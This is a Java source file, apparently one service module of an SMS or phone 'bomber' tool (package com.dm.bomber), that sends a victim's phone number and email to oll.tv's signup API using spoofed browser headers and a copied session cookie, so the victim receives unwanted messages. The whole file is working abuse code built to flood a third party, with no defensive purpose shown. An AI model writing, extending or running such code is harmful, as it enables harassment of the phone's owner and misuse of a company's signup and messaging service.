package com.dm.bomber.services;

import okhttp3.Callback;
import okhttp3.Request;
import okhttp3.RequestBody;

public class Olltv extends Service {

    public Olltv() {
        setPhoneCode("380");
    }

    @Override
    public void run(Callback callback) {
        client.newCall(new Request.Builder()
                .url("https://oll.tv/api/signup?lang=uk")
                .addHeader("Accept", "*/*")
                .addHeader("Accept-Encoding", "gzip, deflate, br")
                .addHeader("Accept-Language", "ru,en-US;q=0.7,en;q=0.3")
                .addHeader("Connection", "keep-alive")
                .addHeader("Content-Length", "320")
                .addHeader("Content-Type", "multipart/form-data; boundary=---------------------------5685021164270826171507483203")
                .addHeader("Cookie", "sessionId=i39sf4gckbel8n7isjucit2vta; _gcl_au=1.1.763044819.1627887885; _ga_6ZVF4TQW3S=GS1.1.1627887885.1.0.1627887885.0; _ga=GA1.2.2051906961.1627887886; _gid=GA1.2.1384972548.1627887887; _hjid=1ad31622-44b4-4fa9-8353-4aa246a5a631; _hjFirstSeen=1; _fbp=fb.1.1627887887286.1142108491; _hjAbsoluteSessionInProgress=0; _dc_gtm_UA-5098183-2=1")
                .addHeader("Host", "oll.tv")
                .addHeader("Origin", "https://oll.tv")
                .addHeader("Referer", "https://oll.tv/uk/oixs_offer")
                .addHeader("Sec-Fetch-Dest", "empty")
                .addHeader("Sec-Fetch-Mode", "cors")
                .addHeader("Sec-Fetch-Site", "same-origin")
                .addHeader("User-Agent", "Mozilla/5.0 (X11; Linux x86_64; rv:90.0) Gecko/20100101 Firefox/90.0")
                .post(RequestBody.create("-----------------------------5685021164270826171507483203\n" +
                        "Content-Disposition: form-data; name=\"phone\"\n\n+" +
                        getFormattedPhone() +
                        "\n-----------------------------5685021164270826171507483203\n" +
                        "Content-Disposition: form-data; name=\"email\"\n\n" +
                        getEmail() +
                        "\n-----------------------------5685021164270826171507483203--\n", null))
                .build()).enqueue(callback);
    }
}
